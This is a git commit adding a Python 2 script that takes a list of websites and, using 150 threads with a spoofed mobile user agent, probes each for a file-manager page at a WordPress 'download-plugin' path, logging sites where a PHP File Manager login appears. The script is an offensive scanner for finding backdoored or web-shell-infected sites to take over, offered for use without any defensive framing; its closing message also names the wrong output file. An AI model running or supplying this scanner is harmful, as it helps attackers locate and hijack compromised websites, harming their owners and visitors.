e8ed6b4ced7d87897c3dfe43d8894ac0e7203d8d
Tirta Sadewa <164215054+saungnet99@users.noreply.github.com>
2024-07-30 08:06:42 +0700

    Add files via upload

---
+++ Download.py
@@ -0,0 +1,67 @@
+# -*-coding:Latin-1 -*
+import sys , requests, re
+from multiprocessing.dummy import Pool
+from colorama import Fore
+from colorama import init
+init(autoreset=True)
+
+fr  =   Fore.RED
+fc  =   Fore.CYAN
+fw  =   Fore.WHITE
+fg  =   Fore.GREEN
+fm  =   Fore.MAGENTA
+
+
+print """
+[#] Create By ::
+
+
+"""
+
+requests.urllib3.disable_warnings()
+headers = {'Connection': 'keep-alive',
+            'Cache-Control': 'max-age=0',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate',
+            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+            'referer': 'www.google.com'}
+try:
+    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
+except IndexError:
+    path = str(sys.argv[0]).split('\\')
+    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
+
+def URLdomain(site):
+    if site.startswith("http://") :
+        site = site.replace("http://","")
+    elif site.startswith("https://") :
+        site = site.replace("https://","")
+    else :
+        pass
+    pattern = re.compile('(.*)/')
+    while re.findall(pattern,site):
+        sitez = re.findall(pattern,site)
+        site = sitez[0]
+    return site
+
+
+def ovaaioabout(url):
+    try:
+        url = 'http://' + URLdomain(url)
+        check = requests.get(url+'/wp-content/plugins/download-plugin/wp-access.php',headers=headers, allow_redirects=True,timeout=15)
+        if 'PHP File Manager' in check.content or 'input type="password" name="fm_pwd" value="" placeholder="Password"' in check.content:
+                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
+                open('download.txt', 'a').write(url + '/wp-content/plugins/download-plugin/wp-access.php\n')
+        else:
+            print ' -| ' + url + ' --> {}[Failed]'.format(fr)
+    except :
+        print ' -| ' + url + ' --> {}[Failed]'.format(fr)
+
+mp = Pool(150)
+mp.map(ovaaioabout, target)
+mp.close()
+mp.join()
+
+print '\n [!] {}Saved in About-vuln.txt'.format(fc)
